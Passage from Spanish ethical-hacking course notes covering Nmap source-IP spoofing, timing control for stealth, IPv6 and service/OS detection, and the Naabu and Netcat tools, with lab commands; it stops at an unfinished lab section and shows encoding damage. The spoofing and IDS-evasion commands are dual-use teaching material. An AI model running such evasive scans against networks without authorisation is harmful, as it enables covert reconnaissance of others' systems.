## **276. Spoofing de la identididad del atacante con Nmap**

### üß† ¬øQu√© es el "spoofing de identidad del atacante"?

El **IP spoofing** (suplantaci√≥n de identidad IP) consiste en **falsificar la direcci√≥n IP de origen** de un paquete para que parezca que proviene de otra m√°quina (no la tuya).

#### En el contexto de Nmap:

> Puedes hacer que parezca que otro host est√° haciendo el escaneo, **ocultando tu direcci√≥n IP real**.

üéØ Esto se hace con la opci√≥n `-S` de Nmap para especificar la IP de origen **falsificada**.

---

### ‚ö†Ô∏è Importante

El spoofing **NO es lo mismo que se√±uelos** con `-D` (donde Nmap env√≠a paquetes desde varias IPs con tu IP real incluida).
Aqu√≠, con `-S`, est√°s directamente **suplantando la IP de origen**, lo que significa que **NO recibir√°s respuestas** a menos que controles esa IP.

---

### üß∞ ¬øPara qu√© sirve esta t√©cnica?

- Ocultar al verdadero atacante.
- Probar detecci√≥n de spoofing en firewalls o IDS.
- Simular ataques desde otras fuentes.
- Pruebas defensivas o de auditor√≠a de red.

---

### üö´ Limitaciones

- No recibir√°s respuestas si no tienes control sobre la IP spoofeada.
- Muchos routers y sistemas bloquean paquetes spoofeados.
- Necesitas **privilegios de root/admin** para hacerlo.
- Funciona mejor en redes locales o controladas.

---

### üõ†Ô∏è ¬øC√≥mo instalar Nmap?

#### üîπ Kali Linux / Ubuntu / Debian

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ macOS

```bash
brew install nmap
```

#### üîπ Windows

1. Descarga desde: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Inst√°lalo como administrador.

---

### üîê ¬øC√≥mo hacer spoofing de IP con Nmap?

Se usan estas opciones:

| Opci√≥n                   | Descripci√≥n                          |
| ------------------------ | ------------------------------------ |
| `-S <IP>`                | Falsifica la IP de origen (spoofing) |
| `--source-port <puerto>` | Falsifica el puerto de origen        |
| `-e <interfaz>`          | Especifica la interfaz de red a usar |
| `--data-length <bytes>`  | Agrega datos falsos al paquete       |

---

### üìò Ejemplos pr√°cticos

#### üîπ 1. Escaneo con IP spoofeada

```bash
sudo nmap -S 192.168.56.100 -e eth0 192.168.56.102
```

- `-S 192.168.56.100`: hace parecer que el escaneo viene desde esa IP.
- `-e eth0`: usas la interfaz de red que usar√° Nmap para enviar los paquetes.

üîé Si 192.168.56.100 no es tu IP real, no recibir√°s respuesta.

---

#### üîπ 2. IP spoof + puerto de origen falsificado

```bash
sudo nmap -sS -S 192.168.56.100 --source-port 53 -e eth0 192.168.56.102
```

- Usa IP falsificada.
- Spoofea tambi√©n el **puerto 53 (DNS)** para disfrazarse de tr√°fico leg√≠timo.

---

#### üîπ 3. IP spoof + carga falsa

```bash
sudo nmap -sS -S 192.168.56.100 --data-length 100 -e eth0 192.168.56.102
```

- Agrega 100 bytes de datos falsos al paquete.
- Puede servir para evadir firewalls o IDS.

---

### üìò Ejemplo completo y explicado

#### üéØ Escenario

Tienes dos m√°quinas virtuales:

- Kali Linux (atacante): `192.168.56.101`
- V√≠ctima (Windows o Linux): `192.168.56.102`
- IP a suplantar: `192.168.56.150` (otra m√°quina de la red o inventada)

---

#### üß© Paso 1: Verifica la IP de tu interfaz

```bash
ip addr show
```

Busca tu interfaz activa, por ejemplo: `eth0` o `ens33`.

---

#### üß© Paso 2: Ejecuta el escaneo con spoofing

```bash
sudo nmap -sS -S 192.168.56.150 -e eth0 --source-port 53 192.168.56.102
```

üìå Esto env√≠a paquetes:

- Suplantando la IP `192.168.56.150`
- Usando el puerto 53 (parece tr√°fico DNS)
- A la v√≠ctima `192.168.56.102`

---

#### üß© Paso 3: Verifica con Wireshark (opcional)

Abre Wireshark en la red y filtra por:

```
ip.src == 192.168.56.150
```

Ver√°s que los paquetes parecen **provenir de esa IP spoofeada**.

---

### üéØ Resultado esperado

La m√°quina v√≠ctima recibir√° paquetes SYN como si fueran de `192.168.56.150`.

‚ö†Ô∏è Pero t√∫ no recibir√°s respuesta si esa IP no te pertenece (es lo esperado en spoofing real).

---

### ‚úÖ Conclusi√≥n

| T√©cnica         | Resultado                                     |
| --------------- | --------------------------------------------- |
| `-S <IP>`       | Spoofea la IP de origen                       |
| `--source-port` | Spoofea el puerto de origen                   |
| `-e <interfaz>` | Especifica por d√≥nde se enviar√°n los paquetes |

---

### üõ°Ô∏è √âtica y legalidad

- **Nunca uses spoofing en redes ajenas sin permiso.**
- Practica en entornos controlados: VulnHub, TryHackMe, Hack The Box.
- Esta t√©cnica es √∫til para **pentesters, investigadores de seguridad y defensores**.

---

[üîº](#√≠ndice)

---

## **277. Control de la velocidad de escaneo con Nmap**

### üß† ¬øQu√© significa "controlar la velocidad de escaneo"?

Cuando haces un escaneo con Nmap, puedes controlar **cu√°n r√°pido o lento** Nmap env√≠a paquetes al objetivo. Esto te permite:

- Ser **m√°s sigiloso** para evitar ser detectado por un firewall o un IDS.
- O bien, ser **m√°s r√°pido** si est√°s haciendo pruebas en una red propia o segura.

---

### üéØ ¬øPor qu√© es importante?

- Si escaneas **demasiado r√°pido**, un firewall o IDS puede **bloquearte** o detectar la intrusi√≥n.
- Si escaneas **demasiado lento**, puede tomar mucho tiempo en redes grandes.
- Controlar la velocidad te da **flexibilidad para adaptarte a diferentes entornos** (pruebas internas, pentesting, ejercicios de laboratorio, etc.).

---

### üì¶ ¬øC√≥mo se instala Nmap?

#### üîπ En Linux (Debian, Ubuntu, Kali)

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En macOS

```bash
brew install nmap
```

#### üîπ En Windows

1. Descarga desde [https://nmap.org/download.html](https://nmap.org/download.html)
2. Inst√°lalo como administrador (opcional: incluye **Zenmap**, la interfaz gr√°fica).

---

### ‚öôÔ∏è Opciones para controlar la velocidad en Nmap

| Opci√≥n           | Qu√© hace                                            |
| ---------------- | --------------------------------------------------- |
| `-T<0-5>`        | Ajusta el **modo de velocidad** (template timing)   |
| `--scan-delay`   | Establece un **retraso entre paquetes**             |
| `--max-rate`     | Limita el **n√∫mero m√°ximo de paquetes por segundo** |
| `--min-rate`     | Establece el **m√≠nimo de paquetes por segundo**     |
| `--host-timeout` | Tiempo m√°ximo dedicado a cada host                  |

---

### üö¶ Modos de velocidad con `-T`

Nmap tiene 6 niveles predefinidos de velocidad. Van del **m√°s lento y sigiloso** al **m√°s r√°pido y ruidoso**:

| Opci√≥n | Nivel          | Uso                                                   |
| ------ | -------------- | ----------------------------------------------------- |
| `-T0`  | **Paranoid**   | Extremadamente lento. Ideal para evitar detecci√≥n.    |
| `-T1`  | **Sneaky**     | Muy lento, √∫til en entornos hostiles.                 |
| `-T2`  | **Polite**     | M√°s lento para no saturar la red.                     |
| `-T3`  | **Normal**     | Valor por defecto. Equilibrado.                       |
| `-T4`  | **Aggressive** | M√°s r√°pido. Ideal en redes confiables.                |
| `-T5`  | **Insane**     | Extremadamente r√°pido. Puede causar falsos positivos. |

> üìå **Recomendaci√≥n**:
>
> Usa `-T3` o `-T4` para redes conocidas.
>
> Usa `-T1` o `-T2` si est√°s tratando de evitar ser detectado.

---

### üî¨ Otras opciones √∫tiles

#### üîπ `--scan-delay <tiempo>`

Establece un retraso manual entre cada paquete enviado.
Ejemplo:

```bash
--scan-delay 500ms
```

> Paquete cada 0.5 segundos.

---

#### üîπ `--max-rate <pps>`

Limita cu√°ntos paquetes por segundo (pps) puede enviar.
Ejemplo:

```bash
--max-rate 100
```

> M√°ximo 100 paquetes por segundo.

---

#### üîπ `--min-rate <pps>`

Obliga a Nmap a mantener una velocidad m√≠nima.
Ejemplo:

```bash
--min-rate 50
```

> M√≠nimo 50 paquetes por segundo.

---

### üß™ Ejemplos simples

#### üîπ 1. Escaneo lento y sigiloso

```bash
nmap -sS -T1 192.168.56.102
```

- Escaneo SYN muy lento (modo Sneaky).
- Dif√≠cil de detectar.

---

#### üîπ 2. Escaneo r√°pido en red confiable

```bash
nmap -sS -T5 192.168.56.102
```

- S√∫per r√°pido.
- Ruidoso (f√°cilmente detectable por IDS).

---

#### üîπ 3. Escaneo con retardo personalizado

```bash
nmap -sS --scan-delay 1s 192.168.56.102
```

- Espera 1 segundo entre paquetes.
- Muy sigiloso.

---

#### üîπ 4. Escaneo con l√≠mite de velocidad

```bash
nmap -sS --max-rate 50 192.168.56.102
```

- Env√≠a m√°ximo 50 paquetes por segundo.
- M√°s control sobre el tr√°fico.

---

### üìò Ejemplo completo y explicado

#### üéØ Escenario

- Red local: 192.168.56.0/24
- M√°quina v√≠ctima: `192.168.56.102`
- Objetivo: escanear puertos abiertos **de forma sigilosa**.

---

#### ‚úÖ Paso 1: Comando final

```bash
nmap -sS -p 22,80,443 --scan-delay 800ms --max-retries 2 --host-timeout 1m -T2 192.168.56.102
```

#### ‚úÖ ¬øQu√© hace?

| Opci√≥n               | Significado                                   |
| -------------------- | --------------------------------------------- |
| `-sS`                | Escaneo SYN                                   |
| `-p`                 | Escanea puertos 22, 80 y 443                  |
| `--scan-delay 800ms` | Espera 800 ms entre paquetes                  |
| `--max-retries 2`    | Reintenta solo 2 veces si no hay respuesta    |
| `--host-timeout 1m`  | Si tarda m√°s de 1 min, pasa al siguiente host |
| `-T2`                | Modo educado (Polite), evita saturaci√≥n       |

---

### üîê Resultado esperado

```txt
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp closed https
```

‚úîÔ∏è Escaneo controlado, lento, m√°s dif√≠cil de detectar por un IDS.

---

### üß† Resumen r√°pido

| T√©cnica                     | Uso                                      |
| --------------------------- | ---------------------------------------- |
| `-T0` a `-T5`               | Control b√°sico de velocidad              |
| `--scan-delay`              | Control manual del tiempo entre paquetes |
| `--max-rate` / `--min-rate` | L√≠mite de velocidad (pps)                |
| `--host-timeout`            | Tiempo m√°ximo por host                   |
| `--max-retries`             | Cu√°ntas veces reintentar                 |

---

### üõ°Ô∏è Consejos finales

- En pentesting, **empieza lento** y luego ajusta.
- No uses `-T5` en redes ajenas sin permiso.
- Si est√°s en un entorno controlado (como VulnHub, HackTheBox), puedes experimentar con todas las velocidades.

---

[üîº](#√≠ndice)

---

## **278. Escaneos en IPv6 con Nmap**

![IPv6](../img/5_Hacking_Etico_y_Ciberseguridad_Avanzado/IPv6.png "IPv6")

### üß† ¬øQu√© es IPv6?

IPv6 es la **versi√≥n m√°s reciente del protocolo IP** y reemplaza a IPv4 porque este √∫ltimo se est√° quedando sin direcciones.
Las direcciones IPv6 tienen este formato:

```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
```

Tambi√©n se pueden abreviar as√≠:

```
2001:db8:85a3::8a2e:370:7334
```

IPv6 ya est√° presente en muchas redes modernas (servidores, ISP, dispositivos IoT, etc.), y **Nmap soporta escaneos en IPv6** con algunas diferencias respecto a IPv4.

---

### üì¶ Instalaci√≥n de Nmap (si no lo tienes)

#### üîπ En Linux (Debian, Ubuntu, Kali):

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En macOS:

```bash
brew install nmap
```

#### üîπ En Windows:

1. Descarga desde: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Inst√°lalo como administrador.

---

### ‚úÖ Requisitos para escanear IPv6

Para escanear en IPv6, necesitas:

- Que el objetivo tenga una direcci√≥n IPv6 conocida y activa.
- Que tu equipo tambi√©n tenga conectividad IPv6.
- Usar la opci√≥n `-6` en todos los comandos de Nmap.

---

### üõ†Ô∏è Comandos b√°sicos para IPv6 con Nmap

#### ‚úÖ Sintaxis general:

```bash
nmap -6 <direcci√≥n_IPv6>
```

> El `-6` **activa el modo IPv6**, obligatorio cuando escaneas direcciones de este tipo.

---

### üî¨ Ejemplos sencillos

#### üîπ 1. Ping scan IPv6

Verifica si el host est√° activo (como `nmap -sn` en IPv4):

```bash
nmap -6 -sn 2001:db8::1
```

---

#### üîπ 2. Escaneo de puertos TCP est√°ndar

```bash
nmap -6 2001:db8::1
```

- Escanea los 1000 puertos TCP m√°s comunes en esa direcci√≥n IPv6.

---

#### üîπ 3. Escaneo de puertos espec√≠ficos

```bash
nmap -6 -p 22,80,443 2001:db8::1
```

- Escanea los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).

---

#### üîπ 4. Escaneo agresivo IPv6

```bash
nmap -6 -A 2001:db8::1
```

Activa:

- Detecci√≥n de sistema operativo
- Versiones de servicios
- Traceroute
- Scripts NSE b√°sicos

---

### üöÄ Ejemplo completo y funcional

#### üéØ Escenario

Tienes conectividad IPv6 en tu equipo, y un servidor (o VM) con direcci√≥n:

```bash
2001:db8:abcd:1234::10
```

Quieres hacer un escaneo completo y descubrir puertos, servicios, y versiones.

---

#### ‚úÖ Comando final:

```bash
sudo nmap -6 -sS -A -T4 -p- 2001:db8:abcd:1234::10
```

#### ‚úÖ ¬øQu√© hace?

| Opci√≥n | Funci√≥n                                    |
| ------ | ------------------------------------------ |
| `-6`   | Activa escaneo IPv6                        |
| `-sS`  | Escaneo SYN (r√°pido)                       |
| `-A`   | An√°lisis agresivo (OS, servicios, scripts) |
| `-T4`  | Escaneo r√°pido (pero fiable)               |
| `-p-`  | Escanea todos los 65535 puertos            |

---

#### ‚úÖ Resultado esperado (ejemplo ficticio):

```txt
Nmap scan report for 2001:db8:abcd:1234::10
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu
80/tcp    open   http       Apache httpd 2.4.41
443/tcp   open   ssl/http   Apache httpd 2.4.41

OS details: Linux 5.4 - 5.8
```

---

### üéØ Tip extra: Escaneo de m√∫ltiples hosts IPv6

Puedes escanear m√°s de una direcci√≥n:

```bash
nmap -6 -sS 2001:db8::1 2001:db8::2 2001:db8::3
```

O usar un archivo con direcciones IPv6:

```bash
nmap -6 -iL ipv6_hosts.txt
```

---

### ‚ö†Ô∏è Notas importantes

1. No puedes usar nombres de dominio **IPv4-only** con `-6`.

   - Aseg√∫rate de que el dominio tenga un **registro AAAA** (IPv6).
   - Ejemplo v√°lido:

     ```bash
     nmap -6 google.com
     ```

     Solo si `google.com` tiene un registro AAAA.

2. Algunos scripts y opciones de Nmap pueden **no funcionar en IPv6** si requieren IPv4 (por ejemplo, traceroute m√°s detallado).

3. Escanear redes enteras con IPv6 no es viable como en IPv4:

   - Una red IPv6 tiene **demasiadas direcciones posibles (2^64 por subred)**.
   - En vez de eso, escanea hosts conocidos con IPv6.

---

### üß† Resumen r√°pido

| Comando | Acci√≥n                                    |
| ------- | ----------------------------------------- |
| `-6`    | Activa escaneo en modo IPv6               |
| `-sn`   | Escaneo solo de ping                      |
| `-p`    | Especifica puertos                        |
| `-A`    | Escaneo agresivo (OS, servicios, scripts) |
| `-sS`   | Escaneo SYN (r√°pido)                      |

---

[üîº](#√≠ndice)

---

## **279. Escaneo avanzado de servicios y SO**

### üß† ¬øQu√© es un escaneo avanzado de servicios y sistema operativo?

Cuando haces un escaneo simple con Nmap, puedes descubrir **qu√© puertos est√°n abiertos**.

Pero un escaneo **avanzado** te dice:

‚úÖ Qu√© servicios corren en esos puertos

‚úÖ Qu√© versiones espec√≠ficas tienen (por ejemplo, Apache 2.4.41)

‚úÖ Qu√© sistema operativo (y versi√≥n) usa la m√°quina (por ejemplo, Linux Ubuntu 20.04)

> Esto es **cr√≠tico en auditor√≠as de seguridad** o pentesting porque te da informaci√≥n para saber **c√≥mo atacar o proteger** un sistema.

---

### üì¶ ¬øC√≥mo instalar Nmap?

#### üîπ En Linux (Debian, Ubuntu, Kali, etc.)

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En macOS

```bash
brew install nmap
```

#### üîπ En Windows

1. Descarga desde [https://nmap.org/download.html](https://nmap.org/download.html)
2. Inst√°lalo como administrador.
3. Puedes usar tambi√©n **Zenmap**, que es la interfaz gr√°fica de Nmap.

---

### üîç ¬øQu√© opciones de Nmap permiten hacer escaneos avanzados?

#### Las m√°s importantes:

| Opci√≥n     | ¬øQu√© hace?                                                  |
| ---------- | ----------------------------------------------------------- |
| `-sV`      | Detecci√≥n de versiones de servicios                         |
| `-O`       | Detecci√≥n del sistema operativo                             |
| `-A`       | Escaneo agresivo: combina `-sV`, `-O`, traceroute y scripts |
| `--script` | Ejecuta scripts NSE (detecci√≥n y explotaci√≥n)               |

---

### üî¨ Ejemplos simples

#### üîπ 1. Detectar servicios y versiones

```bash
nmap -sV 192.168.1.10
```

üîé Resultado:

```txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2
80/tcp   open  http    Apache httpd 2.4.41
```

---

#### üîπ 2. Detectar sistema operativo

```bash
sudo nmap -O 192.168.1.10
```

üîé Resultado:

```txt
Running: Linux 5.X
OS details: Linux 5.4 - 5.8
```

> üí° Requiere privilegios (sudo) y puertos abiertos.

---

#### üîπ 3. Escaneo agresivo (todo en uno)

```bash
sudo nmap -A 192.168.1.10
```

Esto ejecuta:

- Detecci√≥n de SO (`-O`)
- Detecci√≥n de versi√≥n (`-sV`)
- Traceroute
- Scripts NSE b√°sicos

---

#### üîπ 4. Escaneo de todos los puertos y servicios

```bash
sudo nmap -sS -sV -O -p- 192.168.1.10
```

- `-sS`: escaneo SYN (r√°pido)
- `-p-`: escanea todos los 65535 puertos

---

### üß™ Scripts NSE (Opcional, pero poderoso)

Puedes usar `--script` para usar los **scripts NSE** de Nmap. Ejemplos:

```bash
nmap -sV --script=banner 192.168.1.10
```

Otros scripts √∫tiles:

```bash
--script=ssl-cert          # Verifica certificados SSL
--script=http-enum         # Enumera recursos HTTP
--script=smb-os-discovery  # Detecci√≥n de SO v√≠a SMB
--script=ftp-anon          # Verifica acceso an√≥nimo en FTP
```

---

### ‚úÖ Ejemplo completo y explicado

#### üéØ Escenario

Tienes una m√°quina con IP `192.168.1.10` y quieres:

- Detectar todos los servicios
- Saber las versiones
- Saber qu√© sistema operativo usa
- Obtener m√°s informaci√≥n sin saturar la red

---

#### Comando final:

```bash
sudo nmap -sS -sV -O -p- --script=banner -T4 192.168.1.10
```

#### üîç ¬øQu√© hace cada parte?

| Opci√≥n            | Funci√≥n                               |
| ----------------- | ------------------------------------- |
| `-sS`             | Escaneo SYN (r√°pido y sigiloso)       |
| `-sV`             | Detecta versiones de servicios        |
| `-O`              | Detecta sistema operativo             |
| `-p-`             | Escanea todos los puertos             |
| `--script=banner` | Intenta leer banners de los servicios |
| `-T4`             | Escaneo m√°s r√°pido (pero seguro)      |

---

#### üîé Resultado esperado:

```txt
PORT      STATE  SERVICE  VERSION
21/tcp    open   ftp      vsftpd 3.0.3
22/tcp    open   ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open   http     Apache httpd 2.4.41
3306/tcp  open   mysql    MySQL 5.7.33

OS details: Linux 5.4 - 5.8 (Ubuntu 20.04)

Banner grab:
80/tcp: Server: Apache/2.4.41 (Ubuntu)
```

---

### üöÄ ¬øY si quiero guardar el resultado?

Puedes exportarlo con:

```bash
nmap -sV -O -oN resultado.txt 192.168.1.10
```

- `-oN`: guarda en formato legible (normal)
- Tambi√©n puedes usar `-oX` (XML) o `-oG` (greppable)

---

### ‚ö†Ô∏è Recomendaciones

- Siempre usa `sudo` para obtener mejor precisi√≥n en detecci√≥n de SO.
- El escaneo de todos los puertos (`-p-`) puede demorar m√°s tiempo.
- Si un firewall est√° presente, puedes agregar opciones de evasi√≥n (como `--source-port`, `-f`, etc.)

---

### üß† Resumen r√°pido

| Objetivo                   | Comando                                       |
| -------------------------- | --------------------------------------------- |
| Detectar versiones         | `nmap -sV IP`                                 |
| Detectar SO                | `sudo nmap -O IP`                             |
| Todo en uno                | `sudo nmap -A IP`                             |
| Puertos completos + script | `sudo nmap -sS -sV -O -p- --script=banner IP` |

---

[üîº](#√≠ndice)

---

## **280. Alternativas a Nmap: Naabu y Netcat**

### ¬øPor qu√© buscar alternativas a Nmap?

**Nmap** es extremadamente completo, pero a veces necesitas:

- **Escaneo masivo y muy r√°pido de puertos en grandes superficies de ataque** ‚Üí _Naabu_ brilla aqu√≠ (SYN / CONNECT / UDP, entrada por dominios, CIDRs, ASN, salida JSON, integraci√≥n con Nmap para profundizar solo donde hay puertos abiertos). ([docs.projectdiscovery.io][2], [GitHub][1])
- **Pruebas manuales r√°pidas, banner grabbing, transferencias simples, crear listeners, depurar sockets, escanear rangos peque√±os** ‚Üí _Netcat_ (nc) cl√°sico / OpenBSD nc / _Ncat_ (la versi√≥n moderna del proyecto Nmap, con TLS, proxy y soporte IPv4/IPv6) son la ‚Äúnavaja suiza‚Äù de TCP/UDP desde la l√≠nea de comandos. ([nmap.org][3], [man.openbsd.org][4])

---

### Resumen comparativo r√°pido

| Herramienta                       | Para qu√© es mejor                                            | Ventajas clave                                                                                                                                         | Cu√°ndo usarla                                                                 |
| --------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
| **Naabu**                         | Enumeraci√≥n **r√°pida de puertos** en grandes listas de hosts | Escaneos SYN/CONNECT/UDP; top-ports; salida JSON; integraci√≥n con Nmap; soporte IPv4/IPv6 (experimental). ([docs.projectdiscovery.io][2], [GitHub][1]) | Recolecci√≥n inicial de superficie de ataque antes de un an√°lisis profundo.    |
| **Netcat / nc**                   | Interacci√≥n manual con puertos y servicios                   | Conectar, escuchar, escanear rangos, enviar/recibir datos (TCP/UDP), transferir archivos. ([man.openbsd.org][4])                                       | Depuraci√≥n puntual, pruebas r√°pidas de servicio, scripting sencillo.          |
| **Ncat** (Netcat moderno de Nmap) | Todo lo anterior + funciones modernas                        | IPv4/IPv6, TCP/UDP, TLS/SSL, proxy (SOCKS/HTTP), encadenamiento, binarios listos en paquetes Nmap (Win/Mac/Linux). ([nmap.org][3])                     | Cuando necesitas Netcat ‚Äúmejorado‚Äù multiplataforma, especialmente en Windows. |

---

### Instalaci√≥n de **Naabu**

Naabu se distribuye como c√≥digo Go y como binarios precompilados. Requiere una biblioteca de captura de paquetes (libpcap) para escaneos de bajo nivel (SYN). ([GitHub][1])

#### Instalaci√≥n con Go

Si tienes Go reciente instalado:

```bash
go install -v github.com/projectdiscovery/naabu/cmd/naabu@latest
```

(O en versiones nuevas del repositorio: `github.com/projectdiscovery/naabu/v2/cmd/naabu@latest` seg√∫n la rama actual.) Despu√©s de compilar, el binario queda en `~/go/bin/naabu` (aseg√∫rate de agregarlo a tu `$PATH`). ([docs.projectdiscovery.io][5], [GitHub][1])

#### Agregar al PATH (Linux/macOS)

```bash
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
source ~/.bashrc
```

Esto hace que puedas ejecutar `naabu` desde cualquier carpeta. ([docs.projectdiscovery.io][5])

#### Instalaci√≥n desde binario

Descarga el √∫ltimo release para tu sistema operativo desde la p√°gina de lanzamientos de Naabu, descomprime y ejecuta el binario. ([docs.projectdiscovery.io][5])

#### Recomendaciones de ejecuci√≥n

- Instala `libpcap` (Linux: `sudo apt install -y libpcap-dev`; macOS: `brew install libpcap`) antes de usar Naabu para escaneos SYN. ([GitHub][1])
- Ejecutar como **root** mejora la capacidad de enviar paquetes sin restricciones (especialmente SYN raw). Los desarrolladores recomiendan hacerlo para mejores resultados. ([docs.projectdiscovery.io][6], [GitHub][1])
- Si escaneas desde una m√°quina local (no VPS), reduce la tasa de paquetes (`-rate`) para no saturar tu red. ([docs.projectdiscovery.io][6])

---

### Instalaci√≥n de **Netcat / Ncat**

Hay m√∫ltiples sabores:

- **nc.openbsd** (la reimplementaci√≥n moderna con soporte IPv6, proxies y sockets Unix). ([man.openbsd.org][4], [Ask Ubuntu][7])
- **netcat-traditional** (la versi√≥n ‚Äúcl√°sica‚Äù; menos funciones modernas pero incluye la opci√≥n `-e` en algunos empaquetados). ([Ask Ubuntu][7])
- **Ncat** (del proyecto Nmap): Netcat ‚Äúpara el siglo XXI‚Äù con soporte TCP/UDP, IPv4/IPv6, TLS/SSL, proxies, encadenamiento y binarios incluidos en los paquetes oficiales de Nmap para Linux, Windows y macOS. ([nmap.org][3])

#### Linux (Debian/Ubuntu/Kali)

Instala la variante OpenBSD (suele ser la predeterminada):

```bash
sudo apt update
sudo apt install netcat-openbsd -y
```

Si necesitas la tradicional:

```bash
sudo apt install netcat-traditional -y
sudo update-alternatives --config nc   # elegir versi√≥n por defecto
```

La documentaci√≥n de Ubuntu destaca que la versi√≥n OpenBSD a√±ade IPv6, soporte de proxy y sockets Unix; la tradicional carece de varias de esas funciones pero incluye `-e` en algunos builds. ([Ask Ubuntu][7])

#### macOS

Las distribuciones modernas incluyen `nc` estilo OpenBSD; si no, puedes instalar/actualizar con Homebrew:

```bash
brew install netcat
```

(OpenBSD nc soporta IPv4/IPv6, TCP/UDP, escucha, escaneo, proxies, etc.). ([man.openbsd.org][4])

#### Windows

La opci√≥n m√°s limpia y mantenida es instalar **Nmap**, que incluye **Ncat** (binarios para Windows, con soporte TLS y proxy). ([nmap.org][3])

---

### Uso esencial de **Naabu** (descubrimiento r√°pido de puertos)

Naabu est√° dise√±ado para **enumerar puertos v√°lidos de manera veloz y fiable** en hosts individuales, listas, CIDRs o incluso ASNs. Puede usar escaneos SYN, CONNECT o UDP; selecciona puertos completos o listas top; produce salida en texto, JSON o CSV. ([docs.projectdiscovery.io][2], [GitHub][1])

#### Escaneo b√°sico de un host

```bash
naabu -host ejemplo.com
```

Por defecto escanea los **Top 100 puertos** (lista basada en Nmap). ([GitHub][1])

#### Escanear todos los puertos

```bash
naabu -p - -host ejemplo.com
```

`-p -` = rango completo 1-65535. ([GitHub][1])

#### Escanear puertos espec√≠ficos y rangos (TCP + UDP)

```bash
naabu -p 80,443,21-23,u:53 -host ejemplo.com
```

`u:53` indica puerto UDP 53. ([GitHub][1])

#### Excluir puertos

```bash
naabu -p - -exclude-ports 80,443 -host ejemplo.com
```

Escaneo completo excepto los especificados. ([GitHub][1])

#### Escanear lista de hosts

```bash
naabu -list hosts.txt
```

Permite entrada masiva (dominios/IPs). ([GitHub][1])

#### Salida JSON (√∫til para automatizar)

```bash
naabu -host 203.0.113.5 -json
```

Produce l√≠neas JSON `{ "ip": "...", "port": ... }` por hallazgo. ([GitHub][1])

#### Control de velocidad

`-rate <pps>` controla paquetes por segundo; ajusta menor en redes locales seg√∫n recomendaciones de los desarrolladores. ([docs.projectdiscovery.io][6], [GitHub][1])

#### Integraci√≥n con Nmap

Tras encontrar puertos abiertos puedes lanzar un comando Nmap para fingerprint de servicios:

```bash
echo ejemplo.com | naabu -nmap-cli 'nmap -sV'
```

Naabu construye una lista de puertos encontrados y ejecuta Nmap con el comando indicado. ([docs.projectdiscovery.io][6], [GitHub][1])

---

### Uso esencial de **Netcat / Ncat** (interacci√≥n manual)

El comando `nc` (Netcat) sirve para _casi todo_ lo relacionado con TCP/UDP: abrir conexiones salientes, escuchar puertos, enviar paquetes, escanear rangos y transferir archivos; soporta IPv4/IPv6 en la versi√≥n OpenBSD. ([man.openbsd.org][4])

**Ncat**, la versi√≥n moderna del proyecto Nmap, extiende esos casos con soporte SSL/TLS, proxies SOCKS/HTTP, encadenamiento y binarios multiplataforma listos (incluidos con Nmap). ([nmap.org][3])

#### Comprobar conexi√≥n a un servicio

```bash
nc -v objetivo 80
```

Con `-v` ver√°s si conecta y puedes escribir manualmente una petici√≥n HTTP para inspeccionar la respuesta. El man page muestra c√≥mo ‚Äúhablar‚Äù directamente con servicios para diagnosticar. ([man.openbsd.org][4])

#### Escaneo de puertos con Netcat

```bash
nc -z objetivo 20-30
```

`-z` (‚Äúzero I/O mode‚Äù) reporta qu√© puertos aceptan conexi√≥n sin enviar datos; ideal para un chequeo r√°pido. Ejemplo documentado en el man page. ([man.openbsd.org][4])

#### Obtener banners de varios puertos

Puedes encadenar con `echo` o `printf` y un timeout para capturar saludos de servicios:

```bash
echo "QUIT" | nc objetivo 25
```

El manual muestra c√≥mo recuperar banners SMTP y SSH de m√∫ltiples puertos con un breve timeout. ([man.openbsd.org][4])

#### Servidor de escucha (listener)

```bash
nc -l -p 1234 > recibido.bin
```

Desde otra m√°quina:

```bash
nc host_remoto 1234 < archivo.bin
```

El man page incluye ejemplo de transferencia de archivos usando modo escucha y redirecci√≥n de stdin/stdout. ([man.openbsd.org][4])

#### Seleccionar versi√≥n / comportamientos

En Ubuntu puedes alternar entre `netcat-openbsd` (m√°s funciones modernas: IPv6, proxy, Unix sockets) y `netcat-traditional` (hist√≥rica; incluye `-e` en algunos empaquetados). Usa `update-alternatives` para elegir. ([Ask Ubuntu][7])

#### Ncat con TLS y proxy (ejemplo)

```bash
ncat --ssl www.ejemplo.com 443
```

Ncat agrega soporte integrado para TLS/SSL, IPv4/IPv6 y conexiones v√≠a proxy (SOCKS o HTTP CONNECT) m√°s capacidades de redirecci√≥n compleja, todo dentro del paquete Nmap. ([nmap.org][3])

---

### Flujo de trabajo combinado: _Naabu ‚Üí Netcat ‚Üí (Opcional) Nmap_

**Objetivo:** Escanear r√°pidamente muchos hosts, identificar puertos abiertos y luego inspeccionar manualmente servicios cr√≠ticos.

1. **Descubrimiento masivo**: Usa Naabu con `-top-ports 1000` o `-p -` seg√∫n el tama√±o del objetivo; salida JSON para script. ([GitHub][1])
2. **Filtrado**: Parseas resultados y seleccionas puertos sensibles (SSH, RDP, DB, Web). (Proceso tuyo; Naabu ya entrega lista). ([GitHub][1])
3. **Validaci√≥n / Banner grabbing**: Usa Netcat/Ncat para conectarte a cada puerto y extraer banners o enviar comandos m√≠nimos; la documentaci√≥n muestra hablar ‚Äúa mano‚Äù con servidores y recuperar banners. ([man.openbsd.org][4], [nmap.org][3])
4. **Fingerprint profundo**: Lanza Nmap con `-sV` o escaneo agresivo usando la integraci√≥n autom√°tica de Naabu (`-nmap-cli`). ([docs.projectdiscovery.io][6], [GitHub][1])

---

### Laboratorio completo paso a paso (Naabu + Netcat + Nmap)

**Escenario de pr√°ctica (recomendado en laboratorio o red interna controlada):**

